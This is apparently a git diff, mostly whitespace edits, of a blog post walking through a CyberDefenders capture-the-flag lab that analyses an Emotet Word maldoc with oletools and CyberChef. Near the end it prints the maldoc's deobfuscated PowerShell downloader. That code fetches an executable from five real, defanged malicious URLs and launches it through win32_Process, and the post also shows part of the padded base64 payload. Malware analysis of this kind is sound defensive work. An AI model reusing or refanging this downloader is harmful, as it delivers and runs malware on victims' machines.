@@ -8,24 +8,23 @@ largeimage: /images/avatar.jpg
 
 ---
 
-# Another go at CyberDefenders.org 
+# Another go at CyberDefenders.org
 
 Having another go at a [CyberDefenders](https://cyberdefenders.org/) challenge, this one about maldocs. You can find a link to the challenge [here](https://cyberdefenders.org/labs/51).
 
 ## Environment
 
-I did this through Windows Subsystem for Linux 2. I already have that environment installed and working, but any linux environment should give you a very similar path to follow what I did. 
+I did this through Windows Subsystem for Linux 2. I already have that environment installed and working, but any linux environment should give you a very similar path to follow what I did.
 
-I also grabbed [oletools](https://github.com/decalage2/oletools) as this is the king of the maldoc analyzers. My install process followed the instructions on his page (slightly modified) to `pip3 install oletools --user` and I also separately grabbed oledump from [here](https://blog.didierstevens.com/programs/oledump-py/) as it wasn't included. Simply wget and unzipped it to my temporary working directory, which made a mess, but we only have one file we're working with so who's counting? 
-
+I also grabbed [oletools](https://github.com/decalage2/oletools) as this is the king of the maldoc analyzers. My install process followed the instructions on his page (slightly modified) to `pip3 install oletools --user` and I also separately grabbed oledump from [here](https://blog.didierstevens.com/programs/oledump-py/) as it wasn't included. Simply wget and unzipped it to my temporary working directory, which made a mess, but we only have one file we're working with so who's counting?
 
 ## Some notes
 
-I appreciate them renaming this file to sample.bin so someone doesn't accidentally maldoc themselves. I am also just generally impressed at the experience on this site. Just sign up, go to a lab, and start plugging away. I'm currently downloading a 27gig macos forensics image and I'm surprised no one's charging me. 
+I appreciate them renaming this file to sample.bin so someone doesn't accidentally maldoc themselves. I am also just generally impressed at the experience on this site. Just sign up, go to a lab, and start plugging away. I'm currently downloading a 27gig macos forensics image and I'm surprised no one's charging me.
 
-## Question 1: What streams contain macros in this document? 
+## Question 1: What streams contain macros in this document?
 
-To know what they're asking for here, it helps to be familiar with the structure of the file. Yet again, back at Didier Steven's excellent documentation for info on that [here](https://olefile.readthedocs.io/en/latest/OLE_Overview.html). 
+To know what they're asking for here, it helps to be familiar with the structure of the file. Yet again, back at Didier Steven's excellent documentation for info on that [here](https://olefile.readthedocs.io/en/latest/OLE_Overview.html).
 
 His description is as follows:
 
@@ -63,7 +62,7 @@ $ python oledump.py sample.bin                                                  
 
 We can see 3 streams identified with M for macro i guess. We submit 13,15,16 and get our first flag.
 
-## Question 2: What event is used to begin the execution of the macros?	
+## Question 2: What event is used to begin the execution of the macros? 
 
 We can use olevba to break down this document in a way we can digest very easily. I pipe it to less because there is a lot of output and its good to start from the top. Right away, we see the function that's guilty, `Document_open`
 
@@ -82,17 +81,17 @@ boaxvoebxiotqueb
 End Sub
 ~~~
 
-You can read more about that [here](https://docs.microsoft.com/en-us/office/vba/api/word.document.open) before submitting the flag. 
+You can read more about that [here](https://docs.microsoft.com/en-us/office/vba/api/word.document.open) before submitting the flag.
 
 ## Question #3: Identify the malware family
 
 We can get a hash of the file and see if Virustotal has seen it yet, it should be pretty quick if it has.
 
-https://www.virustotal.com/gui/file/d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee/detection
+<https://www.virustotal.com/gui/file/d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee/detection>
 
-Luck would have it, its already been uploaded, and this is Emotet. 
+Luck would have it, its already been uploaded, and this is Emotet.
 
-## Question 4: What stream is responsible for the storage of the base64-encoded string?	
+## Question 4: What stream is responsible for the storage of the base64-encoded string? 
 
 This one was honestly a guess for me. I tried olevba'ing it, I could see content was flagged as base64 encoded in the function `roubhaol` but I couldn't find the exact stream. I oledump'ed the file again and reviewed the output
 
@@ -105,11 +104,11 @@ This one was honestly a guess for me. I tried olevba'ing it, I could see content
  36:       444 'Macros/roubhaol/o'
 ~~~
 
-My guess here was the biggest section must have it, so 34 is your flag. 
+My guess here was the biggest section must have it, so 34 is your flag.
 
-## Question 5: This document contains a user-form. Provide the name?	
+## Question 5: This document contains a user-form. Provide the name? 
 
-Here, we can oledir the file to see all the parts of it, and browse it as a directory structure. 
+Here, we can oledir the file to see all the parts of it, and browse it as a directory structure.
 
 ~~~bash
 computer@computer: ~/gits/MalDoc101
@@ -146,9 +145,9 @@ id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size
 
 Here, we can clearly see that `roubhaol` again is the interesting part of the document, and that is our flag. The Forms.Frame and Forms.Multipage are indicators of the user form being present.
 
-## Question 6: This document contains an obfuscated base64 encoded string; what value is used to pad (or obfuscate) this string?	
+## Question 6: This document contains an obfuscated base64 encoded string; what value is used to pad (or obfuscate) this string? 
 
-Review the Suspicious string, this is a snippet of it. 
+Review the Suspicious string, this is a snippet of it.
 
 ~~~bash
 �p2342772g3&*gs7712ffvs626fqo2342772g3&*gs7712ffvs626fqw2342772g3&*gs7712ffvs626fqe2342772g3&*gs7712ffvs626fqr2342772g3&*gs7712ffvs626fqs2342772g3&*gs7712ffvs626fqh2342772g3&*gs7712ffvs626fqeL2342772g3&*gs7712ffvs626fqL2342772g3&*gs7712ffvs626fq 2342772g3&*gs7712ffvs626fq-2342772g3&*gs7712ffvs626fqe2342772g3&*gs7712ffvs626fq JABsAG2342772g3&*gs7712ffvs626fqkAZQBj2342772g3&*gs7712ffvs626fqAGgAcg2342772g3&*gs7712ffvs626fqBvAHUA2342772g3&*gs7712ffvs626fqaAB3AH2342772g3&*gs7712ffvs626fqUAdwA92342772g3&*gs7712ffvs626fqACcAdg2342772g3&*gs7712ffvs626fqB1AGEA2342772g3&*gs7712ffvs626fqYwBkAG2342772g3&*gs7712ffvs626fq8AdQB22342772g3&*gs7712ffvs626fqAGMAaQ2342772g3&*gs7712ffvs626fqBvAHgA2342772g3&*gs7712ffvs626fqaABhAG2342772g3&*gs7712ffvs626fq8AbAAn2342772g3
@@ -160,17 +159,17 @@ What string do we see repeating? It's difficult to get it visually, but since we
 feaxgeip = Split(geutyoeytiestheug, "2342772g3&*gs7712ffvs626fq")
 ~~~
 
-## Question 7: What is the purpose of the base64 encoded string?	
+## Question 7: What is the purpose of the base64 encoded string? 
 
-These are always hard for me because I don't know exactly what the question wants. We can run the doc through `olevba sample.bin --reveal -a` which will give us the output we can work with, then take the very large text block that starts with `p2342772g3&*gs7...` and get that into cyber chef to deobfuscate it. This [recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'2342772g3%26*gs7712ffvs626fq'%7D,'',true,false,false,false)) will remove the padding, 
+These are always hard for me because I don't know exactly what the question wants. We can run the doc through `olevba sample.bin --reveal -a` which will give us the output we can work with, then take the very large text block that starts with `p2342772g3&*gs7...` and get that into cyber chef to deobfuscate it. This [recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'2342772g3%26*gs7712ffvs626fq'%7D,'',true,false,false,false)) will remove the padding,
 
 Finally, this [recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'2342772g3%26*gs7712ffvs626fq'%7D,'',true,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'powersheLL%20-e%20'%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true)Remove_null_bytes()) will clean up the script, remove the `powersheLL -e` from the beginning, and decode the base64.
 
 To know you're deobfuscating the correct string, it should start with `p234` and end with `fvs626fqA=`.
 
-The flag ends up being the first word of the depadded script, powershell. 
+The flag ends up being the first word of the depadded script, powershell.
 
-## Question 8: What WMI class is used to create the process to launch the trojan?	
+## Question 8: What WMI class is used to create the process to launch the trojan? 
 
 Now that we have the deobfuscated script, it should look something like this (I changed every instance of http or https to hxxp or hxxps):
 
@@ -178,11 +177,11 @@ Now that we have the deobfuscated script, it should look something like this (I 
 $liechrouhwuw='vuacdouvcioxhaol';[Net.ServicePointManager]::"SE`cuRiTy`PRO`ToC`ol" = 'tls12, tls11, tls';$deichbeudreir = '337';$quoadgoijveum='duuvmoezhaitgoh';$toehfethxohbaey=$env:userprofile+'\'+$deichbeudreir+'.exe';$sienteed='quainquachloaz';$reusthoas=.('n'+'ew-ob'+'ject') nEt.weBclIenT;$jacleewyiqu='hxxps://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj/*hxxps://www.techtravel.events/informationl/8lsjhrl6nnkwgyzsudzam_h3wng_a6v5/*hxxp://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*hxxp://holfve.se/images/1ckw5mj49w_2k11px_d/*hxxp://www.cfm.nl/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/'."s`PliT"([char]42);$seccierdeeth='duuzyeawpuaqu';foreach($geersieb in $jacleewyiqu){try{$reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehfethxohbaey);$buhxeuh='doeydeidquaijleuc';If ((.('Get-'+'Ite'+'m') $toehfethxohbaey)."l`eNGTH" -ge 24751) {([wmiclass]'win32_Process')."C`ReaTe"($toehfethxohbaey);$quoodteeh='jiafruuzlaolthoic';break;$chigchienteiqu='yoowveihniej'}}catch{}}$toizluulfier='foqulevcaoj'
 ~~~
 
-We can pretty easily see the wmiclass `win32_Process` and that's our next flag. 
+We can pretty easily see the wmiclass `win32_Process` and that's our next flag.
 
-## Question 9: Multiple domains were contacted to download a trojan. Provide first FQDN as per the provided hint.	
+## Question 9: Multiple domains were contacted to download a trojan. Provide first FQDN as per the provided hint 
 
-We can see above pretty easily the first domain, `haoqunkong[.]com`. Submit it without the square brackets and we're done. 
+We can see above pretty easily the first domain, `haoqunkong[.]com`. Submit it without the square brackets and we're done.
 
 ## OK that's it, again
 
